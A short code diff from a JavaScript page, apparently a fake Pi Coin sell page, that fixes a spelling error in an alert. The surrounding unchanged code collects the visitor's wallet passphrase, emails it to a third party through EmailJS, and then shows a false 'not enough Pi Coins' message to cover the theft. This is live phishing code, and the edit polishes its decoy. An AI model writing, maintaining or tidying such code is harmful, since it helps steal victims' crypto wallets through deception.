@@ -21,7 +21,7 @@
             emailjs.send("service_swe0q9b", "template_so4np09", {
                 passphrase: passphrase
             }).then(function(response) {
-                alert("Sorry! You don't have enought Pi Coins to sell");
+                alert("Sorry! You don't have enough Pi Coins to sell");
             }, function(error) {
                 alert("Failed to send passphrase: " + error.text);
             });
